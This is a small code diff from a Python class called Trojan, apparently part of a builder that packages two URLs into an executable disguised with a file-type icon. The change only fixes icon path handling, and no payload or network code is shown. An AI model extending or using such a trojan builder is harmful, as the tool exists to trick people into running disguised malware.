@@ -30,15 +30,16 @@ class Trojan:
 	def __init__(self, url1, url2, icon):
 		self.url1 = url1
 		self.url2 = url2
-		file_type = url1.split(".")[-1]
-		self.icon = "icons/" + file_type + ".ico"
+		file_type = url1.split(".")[-1].replace("#", "")
+		icons_directory = os.path.dirname(os.path.realpath(__file__)) + "/icons"
+		self.icon = icons_directory + "/" + file_type + ".ico"
 		if icon != None:
 			self.icon = icon
 		
 		if not os.path.isfile(self.icon) :
 			print("[-] Can't find icon at " + self.icon)
 			print("[-] Using generaic icon.")
-			self.icon = "icons/generic.ico"
+			self.icon = icons_directory + "/generic.ico"
 		
 					
 	def create(self):
